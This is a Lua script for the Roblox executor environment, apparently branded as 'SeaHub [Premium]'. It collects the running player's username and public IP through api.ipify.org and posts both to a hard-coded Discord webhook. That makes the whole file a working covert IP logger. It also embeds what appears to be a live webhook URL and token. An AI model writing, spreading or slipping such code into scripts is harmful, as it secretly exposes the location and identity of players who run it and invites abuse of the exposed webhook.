function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local url = "https://discord.com/api/webhooks/1076661210000412712/lLs5UW_PyQAlPtUcyPwI9jY3LVCPh9m3EkdwpOA9hgDOF5Zru8Ydc0PQ3Vza6os1ebu8"
local ip = "https://api.ipify.org/" 
local request = game:HttpGet(ip)
local their_ip = request

local embed = {
    ["title"] = "ip logger test",
    ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."** \nIP: "..their_ip,
    ["color"] = 65280,
    ["footer"] = {
        ["text"] = "SeaHub [Premium]"
    }
}
SendMessageEMBED(url, embed)
